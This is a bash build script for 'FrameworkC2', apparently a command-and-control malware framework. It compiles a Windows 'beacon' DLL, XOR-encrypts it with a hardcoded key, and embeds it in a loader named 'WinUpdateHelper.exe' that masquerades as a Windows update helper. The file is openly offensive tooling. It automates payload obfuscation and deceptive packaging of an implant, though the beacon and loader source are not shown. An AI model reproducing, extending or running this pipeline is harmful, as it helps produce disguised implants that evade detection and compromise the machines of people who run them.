#!/bin/bash
#
# FrameworkC2 Build Script
# ========================
#
# Builds all components and prepares deployment artifacts.
#
# Usage:
#   ./build.sh              # Build all
#   ./build.sh beacon       # Build beacon only
#   ./build.sh loader       # Build loader only
#   ./build.sh package      # Build all + create encrypted beacon + rebuild loader
#

set -e

TARGET="x86_64-pc-windows-gnu"
RELEASE_DIR="target/${TARGET}/release"
XOR_KEY="Fr4m3w0rkC2_K3y!"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log_info() {
    echo -e "${GREEN}[*]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[X]${NC} $1"
}

build_beacon() {
    log_info "Building beacon..."
    cargo build --release --target ${TARGET} --package beacon
    log_info "Beacon built: ${RELEASE_DIR}/beacon.dll"
}

build_loader() {
    log_info "Building loader..."
    cargo build --release --target ${TARGET} --package loader
    log_info "Loader built: ${RELEASE_DIR}/WinUpdateHelper.exe"
}

encrypt_beacon() {
    if [ ! -f "${RELEASE_DIR}/beacon.dll" ]; then
        log_error "beacon.dll not found. Build it first."
        exit 1
    fi
    
    log_info "Encrypting beacon..."
    python3 tools/xor_encrypt.py \
        "${RELEASE_DIR}/beacon.dll" \
        "${RELEASE_DIR}/beacon.dll.enc" \
        $(echo -n "${XOR_KEY}" | xxd -p)
    
    log_info "Encrypted beacon: ${RELEASE_DIR}/beacon.dll.enc"
}

build_loader_with_beacon() {
    log_info "Building loader with embedded beacon..."
    cargo build --release --target ${TARGET} --package loader --features embedded_beacon
    log_info "Loader (with beacon) built: ${RELEASE_DIR}/WinUpdateHelper.exe"
}

show_summary() {
    echo ""
    log_info "Build Summary"
    echo "============================================"
    
    if [ -f "${RELEASE_DIR}/beacon.dll" ]; then
        SIZE=$(ls -lh "${RELEASE_DIR}/beacon.dll" | awk '{print $5}')
        echo "  beacon.dll          : ${SIZE}"
    fi
    
    if [ -f "${RELEASE_DIR}/beacon.dll.enc" ]; then
        SIZE=$(ls -lh "${RELEASE_DIR}/beacon.dll.enc" | awk '{print $5}')
        echo "  beacon.dll.enc      : ${SIZE}"
    fi
    
    if [ -f "${RELEASE_DIR}/WinUpdateHelper.exe" ]; then
        SIZE=$(ls -lh "${RELEASE_DIR}/WinUpdateHelper.exe" | awk '{print $5}')
        echo "  WinUpdateHelper.exe : ${SIZE}"
    fi
    
    echo "============================================"
}

case "${1:-all}" in
    beacon)
        build_beacon
        ;;
    loader)
        build_loader
        ;;
    encrypt)
        encrypt_beacon
        ;;
    package)
        build_beacon
        encrypt_beacon
        build_loader_with_beacon
        show_summary
        ;;
    all)
        build_beacon
        build_loader
        show_summary
        ;;
    *)
        echo "Usage: $0 {beacon|loader|encrypt|package|all}"
        exit 1
        ;;
esac
